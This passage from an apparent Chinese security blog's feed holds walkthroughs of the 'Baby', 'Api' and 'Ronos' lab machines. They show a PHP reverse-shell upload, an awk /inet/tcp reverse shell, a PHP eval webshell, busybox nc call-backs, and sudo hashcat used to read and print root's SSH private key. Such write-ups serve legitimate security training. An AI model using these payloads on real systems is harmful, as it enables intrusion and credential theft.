class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs bash">ccc@Baby:~$ ssh-keygen -t rsa<br>Generating public/private rsa key pair.<br>Enter file <span class="hljs-keyword">in</span> <span class="hljs-built_in">which</span> to save the key (/home/ccc/.ssh/id_rsa): <br>Created directory <span class="hljs-string">&#x27;/home/ccc/.ssh&#x27;</span>.<br>Enter passphrase (empty <span class="hljs-keyword">for</span> no passphrase): <br>Enter same passphrase again: <br>Your identification has been saved <span class="hljs-keyword">in</span> /home/ccc/.ssh/id_rsa<br>Your public key has been saved <span class="hljs-keyword">in</span> /home/ccc/.ssh/id_rsa.pub<br>The key fingerprint is:<br>SHA256:PhHTjSU1RV8m3T+JHSaD8XHA67hTmVGNU8MvKSQ41xU ccc@Baby<br>The key<span class="hljs-string">&#x27;s randomart image is:</span><br><span class="hljs-string">+---[RSA 3072]----+</span><br><span class="hljs-string">|         ..+B*EB*|</span><br><span class="hljs-string">|        o.o*+==O*|</span><br><span class="hljs-string">|        oooo..Oo*|</span><br><span class="hljs-string">|         o  .+o+o|</span><br><span class="hljs-string">|        S   o.+..|</span><br><span class="hljs-string">|       . . . =   |</span><br><span class="hljs-string">|        o   o    |</span><br><span class="hljs-string">|         . o     |</span><br><span class="hljs-string">|            .    |</span><br><span class="hljs-string">+----[SHA256]-----+</span><br></code></pre></td></tr></table></figure><p>执行<code>/opt/ccc.sh</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ccc@Baby:~/.ssh$ <span class="hljs-built_in">sudo</span> /opt/ccc.sh<br></code></pre></td></tr></table></figure><p>获取到root权限</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs bash">ccc@Baby:~/.ssh$ ssh root@127.0.0.1 -i id_rsa<br>The authenticity of host <span class="hljs-string">&#x27;127.0.0.1 (127.0.0.1)&#x27;</span> can<span class="hljs-string">&#x27;t be established.</span><br><span class="hljs-string">ECDSA key fingerprint is SHA256:IV6iZTL6D//1Ojh0d8XoSMepPgjyUfV/FpQmf3q35Hg.</span><br><span class="hljs-string">Are you sure you want to continue connecting (yes/no/[fingerprint])? yes</span><br><span class="hljs-string">Warning: Permanently added &#x27;</span>127.0.0.1<span class="hljs-string">&#x27; (ECDSA) to the list of known hosts.</span><br><span class="hljs-string">Linux Baby 4.19.0-27-amd64 #1 SMP Debian 4.19.316-1 (2024-06-25) x86_64</span><br><span class="hljs-string"></span><br><span class="hljs-string">The programs included with the Debian GNU/Linux system are free software;</span><br><span class="hljs-string">the exact distribution terms for each program are described in the</span><br><span class="hljs-string">individual files in /usr/share/doc/*/copyright.</span><br><span class="hljs-string"></span><br><span class="hljs-string">Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent</span><br><span class="hljs-string">permitted by applicable law.</span><br><span class="hljs-string">Last login: Sun Oct 12 03:42:24 2025 from 192.168.3.94</span><br><span class="hljs-string">root@Baby:~# id</span><br><span class="hljs-string">uid=0(root) gid=0(root) groups=0(root)</span><br></code></pre></td></tr></table></figure><h1 id="五、获取FLAG"><a href="#五、获取FLAG" class="headerlink" title="五、获取FLAG"></a>五、获取FLAG</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bsah">root@Baby:~# cat /root/root.txt /home/bbb/user.txt <br>flag&#123;root-7ed9295c3bdb1aaf2b427b64942b40fb&#125;<br>flag&#123;user-b8694d827c0f13f22ed3bc610c19ec15&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Maze-sec</category>
      
    </categories>
    
    
    <tags>
      
      <tag>文件上传</tag>
      
      <tag>sudo-wc</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Api</title>
    <link href="/Maze-sec/Api/"/>
    <url>/Maze-sec/Api/</url>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>通过抓包，查看返回包，找到一个路径<code>/backend-api</code></p><p>访问<code>/backend-api</code>，存在文件<code>code.php</code>、<code>file.php</code>、<code>uploads</code></p><p>访问<code>file.php</code>，故需要构造文件上传的数据包</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs http">&#123;<br><br>-   &quot;status&quot;: &quot;error&quot;,<br>-   &quot;message&quot;: &quot;仅支持POST请求&quot;,<br>-   &quot;hint&quot;: &quot;请使用POST方法发送请求。&quot;<br><br>&#125;<br></code></pre></td></tr></table></figure><h1 id="文件上传数据包构造"><a href="#文件上传数据包构造" class="headerlink" title="文件上传数据包构造"></a>文件上传数据包构造</h1><p><img src="https://miaorj.oss-cn-chengdu.aliyuncs.com/obsidian/202512101645162.png"></p><p>根据 RFC 1867 协议，文件上传请求体需包含以下结构</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/upload</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>example.com<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>multipart/form-data; boundary=----WebKitFormBoundaryABC123<br><br><span class="language-pgsql"><span class="hljs-comment">------WebKitFormBoundaryABC123</span></span><br><span class="language-pgsql">Content-Disposition: form-data; <span class="hljs-type">name</span>=&quot;file&quot;; filename=&quot;test.txt&quot;</span><br><span class="language-pgsql">Content-<span class="hljs-keyword">Type</span>: <span class="hljs-type">text</span>/plain</span><br><span class="language-pgsql"></span><br><span class="language-pgsql">&lt;文件二进制内容&gt;</span><br><span class="language-pgsql"><span class="hljs-comment">------WebKitFormBoundaryABC123--</span></span><br></code></pre></td></tr></table></figure><p>正确构造 <code>multipart/form-data</code>格式的文件上传数据包</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/backend-api/file.php</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>192.168.2.24<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:145.0) Gecko/20100101 Firefox/145.0<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate, br<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>keep-alive<br><span class="hljs-attribute">Referer</span><span class="hljs-punctuation">: </span>http://192.168.2.24/backend-api/<br><span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>PHPSESSID=glpbe525b95iu26pc1hal761j8<br><span class="hljs-attribute">Upgrade-Insecure-Requests</span><span class="hljs-punctuation">: </span>1<br><span class="hljs-attribute">Priority</span><span class="hljs-punctuation">: </span>u=0, i<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>multipart/form-data; boundary=----WebKitFormBoundaryABC123<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>233<br><br><span class="language-php">------WebKitFormBoundaryABC123</span><br><span class="language-php">Content-Disposition: form-data; name=<span class="hljs-string">&quot;file&quot;</span>; filename=<span class="hljs-string">&quot;rev.php&quot;</span></span><br><span class="language-php">Content-Type: text/plain</span><br><span class="language-php"></span><br><span class="language-php"><span class="hljs-meta">&lt;?php</span></span><br><span class="language-php">  <span class="hljs-title function_ invoke__">exec</span>(<span class="hljs-string">&quot;busybox nc 192.168.2.4 4444 -e /bin/bash&quot;</span>);</span><br><span class="language-php"><span class="hljs-meta">?&gt;</span></span><br><span class="language-php"></span><br><span class="language-php">------WebKitFormBoundaryABC123--</span><br></code></pre></td></tr></table></figure><p>成功进行上传<br><img src="https://miaorj.oss-cn-chengdu.aliyuncs.com/obsidian/202512101644325.png"></p><h1 id="获取到web权限"><a href="#获取到web权限" class="headerlink" title="获取到web权限"></a>获取到web权限</h1><p>反弹shell，成功获取到web权限</p><h1 id="获取xiaozhihuaa的权限"><a href="#获取xiaozhihuaa的权限" class="headerlink" title="获取xiaozhihuaa的权限"></a>获取xiaozhihuaa的权限</h1><p>查看<code>login.php</code>，找到一个模拟的账号密码<code>root:0tmyxZKD1szqdAYe</code><br><img src="https://miaorj.oss-cn-chengdu.aliyuncs.com/obsidian/202512111044974.png"></p><p>使用密码<code>0tmyxZKD1szqdAYe</code>成功切换到<code>xiaozhihuaa</code>用户</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">www-data@Api:/var/www/html$ su xiaozhihuaa<br>Password: <br>xiaozhihuaa@Api:/var/www/html$ <span class="hljs-built_in">id</span><br>uid=1000(xiaozhihuaa) gid=1000(xiaozhihuaa) <span class="hljs-built_in">groups</span>=1000(xiaozhihuaa)<br></code></pre></td></tr></table></figure><h1 id="hashcat提权"><a href="#hashcat提权" class="headerlink" title="hashcat提权"></a>hashcat提权</h1><p>查看<code>sudo</code>，发现<code>hashcat</code>不需要<code>root</code>密码即可执行<code>root</code>权限</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">xiaozhihuaa@Api:/var/www/html$ <span class="hljs-built_in">sudo</span> -l<br>Matching Defaults entries <span class="hljs-keyword">for</span> xiaozhihuaa on Api:<br>    env_reset, mail_badpass,<br>    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin<br><br>User xiaozhihuaa may run the following commands on Api:<br>    (ALL) NOPASSWD: /usr/bin/hashcat<br></code></pre></td></tr></table></figure><p>查看<code>hashcat</code>的命令参数，发现<code>--stdout</code>参数可以不破解哈希值，仅打印候选哈希值，即可读取文件内容。<br>读取<code>root</code>用户的<code>ssh</code>的私钥</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs bash">xiaozhihuaa@Api:/tmp$ <span class="hljs-built_in">sudo</span> /usr/bin/hashcat --stdout /root/.ssh/id_rsa      <br>-----BEGIN OPENSSH PRIVATE KEY-----<br>b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn<br>NhAAAAAwEAAQAAAYEAxBsbwOv96P8ZVQhlo8535L/JWrghUakeplu98FfLqdE6l1ZE0BOB<br>c4xwp8+BNEKDz/HYiOx/NkulCxqrX1zrQdt0AV4bVHKoLQK+r7TaR66cnlel9d5Ig0BAiL<br>eY4DPTEs7ZxzCEJvWNPQWe4WugPaGfo9rmqTF9TgZl0lhC3zgdFq1A6BPUnR/yoEm0yfrg<br>mJOvrSaJkxkvd4y+XXu1dpd6NuEWgqfKaXPCjonU081zvMEs7Ikp9Q7OwuwRg2g/T6oHgw<br>9pMUnkPEPRw4xhopL/hVkedyRlj680nxL1WYlFsHC3GqhRnrMR/zMVCjTU+UnpOEhPRE7y<br>m3PAgbpgE0rzDOzB8gv4awY9QqnB4H7TApHMsVmesrxqNn0WTbSjqIDQRCS8aAXoWkHn3r<br>GwRfljZZRSd16AAwnfwiN4S0n4uKgvVvCIQiFbrqR2C+gyQFm+kAcOIwT9yzbQmFqnsE6J<br>Jda7ZWmCy1Bsr1Muj/T9Q58Z35VsZV6aYcpj06ofAAAFgG+tTntvrU57AAAAB3NzaC1yc2<br>EAAAGBAMQbG8Dr/ej/GVUIZaPOd+S/yVq4IVGpHqZbvfBXy6nROpdWRNATgXOMcKfPgTRC<br>g8/x2IjsfzZLpQsaq19c60HbdAFeG1RyqC0Cvq+02keunJ5XpfXeSINAQIi3mOAz0xLO2c<br>cwhCb1jT0FnuFroD2hn6Pa5qkxfU4GZdJYQt84HRatQOgT1J0f8qBJtMn64JiTr60miZMZ<br>L3eMvl17tXaXejbhFoKnymlzwo6J1NPNc7zBLOyJKfUOzsLsEYNoP0+qB4MPaTFJ5DxD0c<br>OMYaKS/4VZHnckZY+vNJ8S9VmJRbBwtxqoUZ6zEf8zFQo01PlJ6ThIT0RO8ptzwIG6YBNK<br>8wzswfIL+GsGPUKpweB+0wKRzLFZnrK8ajZ9Fk20o6iA0EQkvGgF6FpB596xsEX5Y2WUUn<br>degAMJ38IjeEtJ+LioL1bwiEIhW66kdgvoMkBZvpAHDiME/cs20Jhap7BOiSXWu2VpgstQ<br>bK9TLo/0/UOfGd+VbGVemmHKY9OqHwAAAAMBAAEAAAGAPeO8R49y67SOfxqOUTsY9XVdi6<br>buxQHVrXTopdBfczGYByjvwKdXRGs/JobDZQXU6ayOxO+2WiFXbgC1svv1NyyWGNRlVap1<br>zva9zWALP3Io9YP92XGUeu+tLjibI67XX2kuq8FxA4adU3PRp5y6zpiSdDjicOUwgY5dVh<br>wKxr3D2GNHR7byc8AgZ1u7lb76YMzDNaci5eyd4WHmtkQTieDWbjltTEC+Dbe94BQ5ubpu<br>W1Sv49qKBk/tCvFLuagNPN+1FD9qZZWrawdCNB5kQu62RYUCmuiegrzf7AcAWGcDYgefqm<br>Qihl6GWgMjOXsJ9YDKJSo4Se4Kdq8mnrYJU/MyJYA0zblmpTiYIIUEfoSdiW0PDBvZxpA9<br>7ufLf+vttGFW8RFrgr96R470dFIEzeLxSbNSuPqKd8KdPkWdEBu1s9+EKhJppg9W1vTTV6<br>95bFBD6GFA3Zv7MuzSyg/wPpNiwJPM2BBTN5TueN92+BgW6mN6xjtM2OEIKCTythmBAAAA<br>wB+d89CyX0FBPS0U8OTTy7woL+ZmpkHY2MSFNY7N6+wtT4XPlDYtmzvkElheAYNEiwZdaT<br>SLAwbes4dn8WmjBVXHkya+JAAEQrMskJJAX6WzEHWUQWkgbB4ljLyPcRNtebVCYEA+GIh6<br>KTJNLqcp5Q7VSTEiqJoP0NGUyF5F8JFstQmQfr55nujmci7xalGNtZYvsmXFHUmMoWzK7M<br>xj0vVfq8k3BuOSdlfzSeV4VytMdv7+rC85fTTYJXuDNBkOUgAAAMEA+E9qQy6XLp3MceWE<br>HOPnuWyg8Mf0Vc9FJkcGa9XEXmPvucz7vSMQ4T+fXoRfEwUGopl70XYCZ3S7QbTgBGD6Fv<br>xYVdDVufQqqiq9QKQToPVWQjXUbaWuMlVLyctD5EJuWoATM7kLSbiUPNfHZX/kCrMdcvaD<br>xdfq0x2+okMB6N8+hJ8RoSGx5ll0hfBwMWteOL1RkG+PiwaDMhAqEpmB/oP4F2HxsQgFFa<br>T0CqO9Zm+Iwbfdn2BUNLmxyuWnBtXBAAAAwQDKLdJDGkFoASZZlxzBhZrH550rZ+jQ7T0V<br>56JGnEgYzCXEAP+s75M3WsIrhm6dddgCz6wLNmPVSSleG3FuAW6ss7nPkxzNCf+Z+jEDtC<br>avagxaPTGkxF2XEMGUnWTzT83NQOYHK5t7Efd1N2E0D7WIYD0aNDLr1PzObN2lEiQN0h4O<br>ZLuDf9lJPWPB/O8V06QxrEpu1ktBG3G2ZfbHRV7MDFK/4M/YbxDEA2YnbXw7pBa+TLcGZF<br>zLlbvIB7ezN98AAAAIcm9vdEBBcGkBAgM=<br>-----END OPENSSH PRIVATE KEY-----<br></code></pre></td></tr></table></figure><p>直接使用<code>root</code>用户的私钥进行连接</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/tmp]<br>└─# ssh root@192.168.2.24 -i <span class="hljs-built_in">id</span><br>Linux Api 4.19.0-27-amd64 <span class="hljs-comment">#1 SMP Debian 4.19.316-1 (2024-06-25) x86_64</span><br><br>The programs included with the Debian GNU/Linux system are free software;<br>the exact distribution terms <span class="hljs-keyword">for</span> each program are described <span class="hljs-keyword">in</span> the<br>individual files <span class="hljs-keyword">in</span> /usr/share/doc/*/copyright.<br><br>Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent<br>permitted by applicable law.<br>Last login: Wed Dec 10 22:54:08 2025 from 192.168.2.4<br>root@Api:~# <span class="hljs-built_in">id</span><br>uid=0(root) gid=0(root) <span class="hljs-built_in">groups</span>=0(root)<br></code></pre></td></tr></table></figure><p>查看flag</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">root@Api:~# <span class="hljs-built_in">cat</span> /home/xiaozhihuaa/user.txt /root/root.txt <br>flag&#123;user-7a1b1a56f991412e9b0c1d8e02a5f945&#125;<br>flag&#123;root-9f48a1abe48a40c5bf1830b233775a3c&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Maze-sec</category>
      
    </categories>
    
    
    <tags>
      
      <tag>文件上传，sudo-hashcat</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Ronos</title>
    <link href="/Maze-sec/Ronos/"/>
    <url>/Maze-sec/Ronos/</url>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="靶机说明"><a href="#靶机说明" class="headerlink" title="靶机说明"></a>靶机说明</h1><ul><li>QQ群：<code>660930334</code></li></ul><h1 id="一、信息收集"><a href="#一、信息收集" class="headerlink" title="一、信息收集"></a>一、信息收集</h1><h2 id="1、主机探测"><a href="#1、主机探测" class="headerlink" title="1、主机探测"></a>1、主机探测</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[~/miaosec/maze-sec]<br>└─# nmap -sn 192.168.2.0/24              <br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-10-08 20:16 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.1<br>Host is up (0.00026s latency).<br>MAC Address: 0A:00:27:00:00:07 (Unknown)<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.2<br>Host is up (0.00047s latency).<br>MAC Address: 08:00:27:7F:E7:66 (Oracle VirtualBox virtual NIC)<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.19<br>Host is up (0.00087s latency).<br>MAC Address: 08:00:27:32:1F:7D (Oracle VirtualBox virtual NIC)<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.4<br>Host is up.<br>Nmap <span class="hljs-keyword">done</span>: 256 IP addresses (4 hosts up) scanned <span class="hljs-keyword">in</span> 2.10 seconds<br></code></pre></td></tr></table></figure><p>靶机IP：<code>192.168.2.19</code></p><h2 id="2、端口扫描"><a href="#2、端口扫描" class="headerlink" title="2、端口扫描"></a>2、端口扫描</h2><h3 id="1-全端口扫描"><a href="#1-全端口扫描" class="headerlink" title="1.全端口扫描"></a>1.全端口扫描</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[~/miaosec/maze-sec]<br>└─# nmap --min-rate 10000 -p- 192.168.2.19                   <br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-10-08 20:19 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.19<br>Host is up (0.00058s latency).<br>Not shown: 65533 closed tcp ports (reset)<br>PORT   STATE SERVICE<br>22/tcp open  ssh<br>80/tcp open  http<br>MAC Address: 08:00:27:32:1F:7D (Oracle VirtualBox virtual NIC)<br><br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 37.62 seconds<br></code></pre></td></tr></table></figure><p>开放端口：22、80</p><h3 id="2-详细信息扫描"><a href="#2-详细信息扫描" class="headerlink" title="2.详细信息扫描"></a>2.详细信息扫描</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[~/miaosec/maze-sec]<br>└─# nmap --min-rate 10000 -sT -sV -sC -O -p22,80 192.168.2.19<br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-10-08 20:19 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.19<br>Host is up (0.00062s latency).<br><br>PORT   STATE SERVICE VERSION<br>22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)<br>| ssh-hostkey: <br>|   3072 f6:a3:b6:78:c4:62:af:44:bb:1a:a0:0c:08:6b:98:f7 (RSA)<br>|   256 bb:e8:a2:31:d4:05:a9:c9:31:ff:62:f6:32:84:21:9d (ECDSA)<br>|_  256 3b:ae:34:64:4f:a5:75:b9:4a:b9:81:f9:89:76:99:eb (ED25519)<br>80/tcp open  http    Apache httpd 2.4.62 ((Debian))<br>|_http-title: AWK Command Runner<br>|_http-server-header: Apache/2.4.62 (Debian)<br>MAC Address: 08:00:27:32:1F:7D (Oracle VirtualBox virtual NIC)<br>Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port<br>Device <span class="hljs-built_in">type</span>: general purpose<br>Running: Linux 4.X|5.X<br>OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5<br>OS details: Linux 4.15 - 5.8<br>Network Distance: 1 hop<br>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel<br><br>OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .<br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 8.97 seconds<br></code></pre></td></tr></table></figure><h2 id="3、目录扫描"><a href="#3、目录扫描" class="headerlink" title="3、目录扫描"></a>3、目录扫描</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[~/miaosec/maze-sec]<br>└─# dirsearch -u <span class="hljs-string">&quot;http://192.168.2.19&quot;</span><br>Target: http://192.168.2.19/<br>...<br>[20:27:04] 200 -   23KB - /info.php<br>[20:27:24] 200 -  113B  - /sample.txt<br>...<br></code></pre></td></tr></table></figure><p>找到两个目录<code>/info.php</code>和<code>/sample.txt</code></p><h1 id="二、WEB渗透"><a href="#二、WEB渗透" class="headerlink" title="二、WEB渗透"></a>二、WEB渗透</h1><h2 id="1、访问80端口"><a href="#1、访问80端口" class="headerlink" title="1、访问80端口"></a>1、访问80端口</h2><p><img src="https://miaorj.oss-cn-chengdu.aliyuncs.com/obsidian/202510082028806.png"><br>发现是一个awk的接口，用于执行awk命令</p><h2 id="2、awk反弹shell"><a href="#2、awk反弹shell" class="headerlink" title="2、awk反弹shell"></a>2、awk反弹shell</h2><p>尝试使用awk反弹shell，发现被过滤，无法进行反弹</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">awk <span class="hljs-string">&#x27;BEGIN &#123;s = &quot;/inet/tcp/0/192.168.2.4/4444&quot;; while(42) &#123; do&#123; printf &quot;shell&gt;&quot; |&amp; s; s |&amp; getline c; if(c)&#123; while ((c |&amp; getline) &gt; 0) print $0 |&amp; s; close(c); &#125; &#125; while(c != &quot;exit&quot;) close(s); &#125;&#125;&#x27;</span> /dev/null<br></code></pre></td></tr></table></figure><p><img src="https://miaorj.oss-cn-chengdu.aliyuncs.com/obsidian/202510082031269.png"></p><h2 id="3、awk重定向写入文件"><a href="#3、awk重定向写入文件" class="headerlink" title="3、awk重定向写入文件"></a>3、awk重定向写入文件</h2><p>尝试使用重定向写入文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-string">&#x27;NR == 1 &#123;print &quot;&lt;?=eval($_GET[1])?&gt;&quot; &gt; &quot;1.php&quot;&#125;&#x27;</span><br></code></pre></td></tr></table></figure><p>成功执行id命令<br><img src="https://miaorj.oss-cn-chengdu.aliyuncs.com/obsidian/202510082034305.png"></p><h1 id="三、获取www-data权限"><a href="#三、获取www-data权限" class="headerlink" title="三、获取www-data权限"></a>三、获取www-data权限</h1><p>执行反弹shell的命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">http://192.168.2.19/1.php?1=system(<span class="hljs-string">&quot;busybox nc 192.168.2.4 4444 -e /bin/bash&quot;</span>);<br></code></pre></td></tr></table></figure><p>成功获取到shell</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[~/miaosec/maze-sec]<br>└─# nc -lvnp 4444                         <br>listening on [any] 4444 ...<br>connect to [192.168.2.4] from (UNKNOWN) [192.168.2.19] 35060<br><span class="hljs-built_in">id</span><br>uid=33(www-data) gid=33(www-data) <span class="hljs-built_in">groups</span>=33(www-data)<br></code></pre></td></tr></table></figure><p>稳定shell</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash">script /dev/null -c bash<br><span class="hljs-comment"># 按下 Ctrl+Z 